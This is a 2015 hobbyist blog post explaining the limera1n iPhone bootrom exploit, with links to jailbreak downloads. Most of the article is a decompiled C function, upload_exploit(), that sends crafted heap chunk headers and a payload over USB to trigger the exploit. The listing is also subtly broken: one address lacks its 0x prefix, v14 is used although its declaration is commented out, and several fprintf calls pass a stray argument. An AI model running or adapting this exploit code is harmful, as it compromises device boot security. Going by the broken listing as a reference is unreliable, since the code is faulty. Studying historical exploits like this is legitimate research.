<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>What is limera1n? &#8211; dayt0n</title>
<meta name="description" content="Devices with the limera1n vulnerability are the most fun devices to play with.">
<meta name="keywords" content="limera1n, iphone 4, info">


<meta property="og:locale" content="en_US">
<meta property="og:title" content="What is limera1n? &#8211; dayt0n">
<meta property="og:description" content="Devices with the limera1n vulnerability are the most fun devices to play with.">
<meta property="og:url" content="/articles/what-is-limera1n">
<meta property="og:site_name" content="dayt0n">


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="dayt0n Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Type -->
<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Crimson+Text:400,400italic,700,700italic" rel='stylesheet' type='text/css' />
<link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700" rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="/assets/css/entypo.css" media="all">

<!-- In order to use Calendas Plus, you must first purchase it. Then, create a font-face package using FontSquirrel.
<link rel='stylesheet' href='/assets/cal.css' media='all' />
-->



<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/i.css">

<!-- Fresh Squeezed jQuery -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>


<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="/favicon.ico">

<div id="bump">
  <body class="">
    <header class="site-header">
      <div class="wrap">
        <hgroup>
          <h1><a href="/">dayt0n</a></h1>
        </hgroup>
        <a href="#nav" class="menu"><span class='icons'>☰</span></a>
        <nav role="navigation">
          <ul>
            <li>
              <a href="/" title="dayt0n">Home</a>
            </li>
            
            
                <li><a href="/about" >about</a></li>
            
                <li><a href="https://github.com/dayt0n" target="_blank">github</a></li>
            
                <li><a href="https://ipsw.me" target="_blank">ipsw links</a></li>
            
                <li><a href="/downloads" >downloads</a></li>
            

          </ul>
        </nav>
      </div>
    </header>


<section class="article">


  <div class="overlay"></div>
  
  <div class="featured-image" style="background-image: url(/images/limera1npaper.png)"></div>
  



      <article class="wrap post">
        <header class="post-header">
          <hgroup>
            <h1>What is limera1n?</h1>
            <p class="date">Jan 03, 2015</p>
            <p class="intro">Devices with the limera1n vulnerability are the most fun devices to play with.</p>
          </hgroup>
        </header>

        <h2 id="limera1n">limera1n</h2>
<p>limera1n is a bootrom exploit found by <code>geohot</code> that works on all A4 and below devices. The last devices being the iPhone 4 GSM (1,1)(1,3) and the iPhone 4 CDMA (3,3). It is the last public bootrom exploit to be released to this day. A bootrom exploit is an exploit that can be run on a device with any iOS version. Basically meaning the device can be jailbroken for life. The reason I am talking about limera1n is because it will be mentioned often in my posts. I like to mess around with this exploit a lot and find out all of the cool stuff I can do with it. It has been made into a tethered jailbreak (<a href="https://sites.google.com/site/dayt0nsfiles/downloads/limera1nOSX.zip?attredirects=0&amp;d=1">Mac</a>, <a href="https://sites.google.com/site/dayt0nsfiles/downloads/limera1nWIN.exe.zip?attredirects=0&amp;d=1">Windows</a>) by geohot which you can untether using the <code>0x24000 Segment Overflow</code> exploit or the <code>Packet Filter Kernel Exploit</code>. </p>

<h2 id="code-executed">Code Executed</h2>

<div class="highlight"><pre><code class="c"><span class="kt">signed</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">upload_exploit</span><span class="p">()</span> <span class="p">{</span>
<span class="kt">int</span> <span class="n">device_type</span><span class="p">;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">payload_address</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">free_address</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">deviceerror</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">chunk_headers_ptr</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sent_counter</span><span class="p">;</span>
<span class="c1">//int v6;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> 
<span class="c1">//signed int v8;</span>
<span class="kt">int</span> <span class="n">recv_error_code</span><span class="p">;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">payload_address2</span><span class="p">;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">padding_size</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">payload</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">chunk_headers</span><span class="p">;</span>
<span class="c1">//int v14;</span>
<span class="c1">//v14 = *MK_FP(__GS__, 20);</span>
<span class="n">device_type</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">device</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">device_type</span> <span class="o">==</span> <span class="mi">8930</span> <span class="p">)</span> <span class="p">{</span>
<span class="n">padding_size</span> <span class="o">=</span> <span class="mh">0x2A800</span><span class="p">;</span>
<span class="n">payload_address</span> <span class="o">=</span> <span class="mh">0x8402B001</span><span class="p">;</span>
<span class="n">free_address</span> <span class="o">=</span> <span class="mh">0x8403BF9C</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="n">payload_address</span> <span class="o">=</span> <span class="mh">0x84023001</span><span class="p">;</span>
<span class="n">padding_size</span> <span class="o">=</span> <span class="mh">0x22800</span><span class="p">;</span>
<span class="c1">// free_address = (((device_type == 8920) – 1) &amp; 0xFFFFFFF4) – 0x7BFCC05C;</span>
<span class="k">if</span><span class="p">(</span><span class="n">device_type</span> <span class="o">==</span> <span class="mi">8920</span><span class="p">)</span> <span class="n">free_address</span> <span class="o">=</span> <span class="mh">0x84033FA4</span><span class="p">;</span>
<span class="k">else</span> <span class="n">free_address</span> <span class="o">=</span> <span class="mf">84033F</span><span class="mi">98</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="n">exploit</span><span class="p">,</span> <span class="mh">0x230</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span> <span class="p">{</span>
<span class="c1">//v8 = payload_address;</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Resetting device counters</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="c1">//payload_address = v8;</span>
<span class="p">}</span>

<span class="n">payload_address2</span> <span class="o">=</span> <span class="n">payload_address</span><span class="p">;</span>
<span class="n">deviceerror</span> <span class="o">=</span> <span class="n">irecv_reset_counters</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">deviceerror</span> <span class="p">)</span> <span class="p">{</span>
<span class="n">irecv_strerror</span><span class="p">(</span><span class="n">deviceerror</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">aCannotFindS</span><span class="p">[</span><span class="mi">12</span><span class="p">]);</span>
<span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">chunk_headers_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">;</span>

<span class="k">do</span> <span class="p">{</span>
<span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">=</span> <span class="mi">1029</span><span class="p">;</span>       
<span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">257</span><span class="p">;</span>
<span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">payload_address2</span><span class="p">;</span>  
<span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="n">free_address</span><span class="p">;</span>
<span class="n">chunk_headers_ptr</span> <span class="o">+=</span> <span class="mi">64</span><span class="p">;</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">v14</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Sending chunk headers</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">sent_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>

<span class="k">do</span> <span class="p">{</span>
<span class="n">sent_counter</span> <span class="o">+=</span> <span class="mh">0x800</span><span class="p">;</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">sent_counter</span> <span class="o">&lt;</span> <span class="n">padding_size</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Sending exploit payload</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Sending fake data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Executing exploit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">irecv_reset</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
<span class="n">irecv_finish_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span> <span class="p">{</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Exploit sent</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Reconnecting to device</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">client</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">irecv_reconnect</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>
<span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span> <span class="p">{</span>
<span class="n">recv_error_code</span> <span class="o">=</span> <span class="n">irecv_strerror</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">aCannotFindS</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span> <span class="n">recv_error_code</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to reconnect</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="c1">// compiler stack check</span>
<span class="c1">//if (*MK_FP(__GS__, 20) != v14)</span>
<span class="c1">//    __stack_chk_fail(v6, *MK_FP(__GS__, 20) ^ v14);</span>

<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<h2 id="limera1n-for-newer-devices">limera1n For Newer Devices</h2>
<p>As of now there are no public bootrom exploits for any newer devices. <a href="https://twitter.com/iH8sn0w/">iH8sn0w</a> has found a bootrom exploit for A5 and A5X devices, but has not shared it publicly. He has not done this because he says that with just a bit of tweaking he can make it work on newer devices (A5+). If he were to release it anytime soon, Apple is in a position to release a newer model of a device without any problem, effectivly patching it on half of the devices the bootrom exploit would work on.</p>

<h3 id="dayt0n">-dayt0n</h3>


      <a class="share" href="https://twitter.com/intent/tweet?text=&quot;What is limera1n?&quot;%20http://dayt0n.github.io/articles/what-is-limera1n%20via%20&#64;daytonhasty" data-dnt="true">Share</a>
      <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>

      


      </article>

    </section>
</div>

<div class="push"></div>
  <footer>
    <aside class="wrap">
      <ol class="prev-posts">
        <p class="list-title">Recent Posts</p>
         <!-- for1 -->
            <li>
              <span class="recent-title"><a href="/articles/what-is-limera1n" title="What is limera1n?">What is limera1n? </a></span>
              <span class="date">Jan 03, 2015</span>
            </li>
         <!-- for1 -->
            <li>
              <span class="recent-title"><a href="/articles/sshlock-explained" title="SSHLock Explained">SSHLock Explained </a></span>
              <span class="date">Jan 03, 2015</span>
            </li>
        
      </ol>

      <div class="social">
        <ul>
            <li><a id="mail" href="mailto:daytonhasty@gmail.com"><span class="foot-link">Contact Me</span></a></li>

            
            <li><a id="twit" href="http://twitter.com/daytonhasty" target="_blank"><span class="foot-link">@daytonhasty</span></a></li>
            


            
        </ul>
    </div>
    </aside>
    <small>&copy; 2015 dayt0n.</small>
  </footer>

  <!-- If they're out, get some from the cellar -->
  <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
  <script src="/assets/js/retina.min.js"></script>

  <!-- Custom JS -->
  <script src="/assets/js/scripts.js"></script>


  </body>
</html>

